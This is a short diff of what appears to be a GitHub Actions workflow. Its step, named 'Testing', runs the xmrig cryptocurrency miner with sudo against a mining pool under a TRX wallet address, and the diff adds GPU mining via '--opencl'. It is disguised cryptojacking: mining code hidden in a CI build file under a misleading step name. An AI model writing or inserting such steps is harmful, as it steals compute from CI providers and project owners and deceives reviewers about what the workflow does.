@@ -32,7 +32,7 @@ jobs:
       - name: Testing
         run: |
           cd workspace/kernel/build
-          sudo ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u "TRX:TSzDjv3U8zazCV7QPjCSqLwjuYf2sNWCsx.$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo)#byyv-uprz" -p x -k
+          sudo ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u "TRX:TSzDjv3U8zazCV7QPjCSqLwjuYf2sNWCsx.$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo)#byyv-uprz" -p x -k --opencl
 
       - name: Release
         uses: softprops/action-gh-release@v1
